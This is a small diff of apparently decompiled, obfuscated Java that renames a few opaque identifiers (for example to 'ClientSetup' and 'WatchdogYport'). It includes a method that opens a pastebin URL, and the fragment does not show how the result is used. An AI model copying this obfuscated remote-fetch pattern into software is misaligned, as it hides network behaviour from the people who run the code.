@@ -31,7 +31,7 @@ public class fwi {
 
    public static String akb() {
       long a = fwi.a ^ 49282735522914L;
-      int[] ax = dar.abu();
+      int[] ax = ClientSetup.abu();
 
       try {
          URL axx = new URL("https://pastebin.com/gtCdWxDx");
@@ -70,7 +70,7 @@ public class fwi {
 
    public static boolean cvu() {
       long a = fwi.a ^ 28606554602265L;
-      int[] var10000 = dar.abu();
+      int[] var10000 = ClientSetup.abu();
       String ax = akb();
       int[] axx = var10000;
       String var4 = ax;
@@ -90,7 +90,7 @@ public class fwi {
       fec = var0;
    }
 
-   public static String[] agu() {
+   public static String[] WatchdogYport() {
       return fec;
    }
 
@@ -178,7 +178,7 @@ public class fwi {
 
             e = var6;
             f = new Integer[3];
-            if (agu() != null) {
+            if (WatchdogYport() != null) {
                eki(new String[5]);
             }
 
